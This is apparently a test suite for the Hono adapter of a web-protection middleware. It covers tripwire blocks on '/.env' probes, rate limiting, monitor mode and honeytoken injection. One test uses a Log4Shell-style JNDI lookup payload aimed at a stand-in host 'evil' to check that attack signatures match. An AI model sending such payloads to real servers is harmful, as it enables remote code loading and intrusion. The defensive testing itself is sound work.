import { Hono } from 'hono';
import { tripwire, rateLimit } from '@webdecoy/node';
import { webdecoy } from './index';

/**
 * The Hono adapter, exercised through a real app.
 *
 * Hono runs on Workers, Bun and Deno, so these use `app.request()` — the same
 * fetch-shaped entry point those runtimes call — rather than standing up a
 * server.
 */
function appWith(options: Parameters<typeof webdecoy>[0] = {}) {
  const app = new Hono();
  app.use('*', webdecoy({ mode: 'enforce', rules: [tripwire()], ...options }));
  app.get('/', (c) => c.text('ok'));
  app.get('/health', (c) => c.text('healthy'));
  app.get('/page', (c) => c.html('<html><body><h1>hi</h1></body></html>'));
  app.get('/api', (c) => c.json({ ok: true }));
  return app;
}

describe('the Hono middleware', () => {
  it('serves an ordinary request', async () => {
    const res = await appWith().request('/');
    expect(res.status).toBe(200);
    expect(await res.text()).toBe('ok');
  });

  it('blocks a tripwire hit with 403', async () => {
    const res = await appWith().request('/.env');
    expect(res.status).toBe(403);
    expect(await res.json()).toMatchObject({ error: 'Forbidden' });
  });

  it('answers a rate-limit denial with 429 and Retry-After', async () => {
    const app = appWith({ rules: [rateLimit({ max: 1, window: 60 })] });
    expect((await app.request('/')).status).toBe(200);
    const limited = await app.request('/');
    expect(limited.status).toBe(429);
    expect(limited.headers.get('retry-after')).toBeTruthy();
  });

  it('skips the paths it was told to skip', async () => {
    const res = await appWith({ skipPaths: ['/health'] }).request('/health');
    expect(res.status).toBe(200);
  });

  it('serves the request in monitor mode, which is the default', async () => {
    const app = new Hono();
    app.use('*', webdecoy({ rules: [tripwire()] }));
    app.get('/.env', (c) => c.text('served'));

    const res = await app.request('/.env');
    expect(res.status).toBe(200);
    expect(await res.text()).toBe('served');
  });

  it('exposes the decision on the context even when it allows', async () => {
    // In monitor mode this is the only place the verdict surfaces, and monitor
    // is the default.
    const app = new Hono();
    app.use('*', webdecoy({ rules: [tripwire()] }));
    app.get('/.env', (c) => c.json({ denied: c.get('webdecoy')?.deniedBy('tripwire') ?? null }));

    expect(await (await app.request('/.env')).json()).toEqual({ denied: true });
  });

  it('lets onBlocked shape the response', async () => {
    const app = appWith({
      onBlocked: (c, decision) => c.text(`nope: ${decision.reason ?? ''}`, 418),
    });
    const res = await app.request('/.env');
    expect(res.status).toBe(418);
    expect(await res.text()).toMatch(/^nope:/);
  });

  it('sees the query string, so attack signatures can match on it', async () => {
    const { attackSignatures } = await import('@webdecoy/node');
    const app = appWith({ rules: [attackSignatures()] });
    expect((await app.request('/?x=${jndi:ldap://evil/a}')).status).toBe(403);
    expect((await app.request('/?q=coffee%20or%20tea')).status).toBe(200);
  });
});

describe('honeytoken injection through Hono', () => {
  const withKey = { apiKey: 'sk_live_hono_test', skipLocalAnalysis: true, mode: 'monitor' as const };
  /** The token derives via async HMAC; give it a tick to settle. */
  const settle = () => new Promise((r) => setTimeout(r, 50));

  it('injects into an HTML response', async () => {
    const app = appWith(withKey);
    await settle();
    const body = await (await app.request('/page')).text();
    expect(body).toMatch(/<a [^>]*href="\/__wd\//);
    expect(body).toContain('<h1>hi</h1>');
  });

  it('leaves JSON completely alone', async () => {
    const app = appWith(withKey);
    await settle();
    expect(await (await app.request('/api')).json()).toEqual({ ok: true });
  });

  it('does nothing without an apiKey, since the token derives from it', async () => {
    const app = appWith({ mode: 'monitor' });
    await settle();
    expect(await (await app.request('/page')).text()).toBe(
      '<html><body><h1>hi</h1></body></html>',
    );
  });

  it('does not commit a stale Content-Length', async () => {
    const app = appWith(withKey);
    await settle();
    const res = await app.request('/page');
    const length = res.headers.get('content-length');
    const body = await res.text();
    // Either recomputed or absent. A stale one truncates the body at the client.
    if (length !== null) expect(Number(length)).toBe(new TextEncoder().encode(body).length);
  });
});
